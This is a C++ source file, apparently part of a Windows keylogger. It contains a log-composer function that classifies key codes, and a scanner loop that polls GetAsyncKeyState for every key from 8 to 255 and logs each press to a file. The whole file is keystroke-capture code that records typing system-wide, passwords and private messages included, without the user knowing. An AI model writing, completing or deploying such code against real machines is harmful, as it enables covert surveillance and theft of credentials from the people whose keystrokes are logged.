#include 'pch.h'
#include 'keyscan.h'

//Log composer
bool mainLog(int KEY) {
	//begin with checking for a-z chars
	if (KEY > 64 && KEY < 91) {
		if (LogNormal(KEY) == true) return true;
	}
	//move on to check for chars 0-9
	else if (KEY > 47 && KEY < 58) {
		if (logNumber(KEY) == true) return true;
	}
	//lastly check for special chars
	else if (LogSpecial(KEY) == true) return true;
	//if all fails -> key is not recognised -> don't log anything
	else return false;
}

//Keyboard scanner
bool keyScanner() {
	char KEY = 'x';
	short counter = 0;
	if (!log::get().start())
		return false;

	while (true) {
		if (counter > 250) {
			log::get().restart();
			counter = 0;
		}
		//Sleep to prevent exe from using up one core 100%
		Sleep(1);
		for (int KEY = 8; KEY <= 255; KEY++) {
			if (GetAsyncKeyState(KEY) == -32767) {
				//If KEY is pressed run mainLog (log composer)
				mainLog(KEY);
				counter = 0;
			}
			//if no activity for a while then save the file
			else counter++;
		}
	}
}